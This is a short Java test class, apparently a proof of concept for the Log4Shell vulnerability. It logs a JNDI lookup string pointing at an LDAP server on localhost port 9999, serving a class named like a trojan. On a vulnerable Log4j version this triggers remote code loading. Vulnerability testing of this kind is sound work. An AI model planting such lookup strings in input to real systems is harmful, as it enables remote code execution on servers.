package com.seczone.security.test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LogTest {
    public static Logger log = LogManager.getLogger(LogTest.class);

    public static void main(String[] args) {
        log.error("${jndi:ldap://127.0.0.1:9999/Muma1}");
    }
}
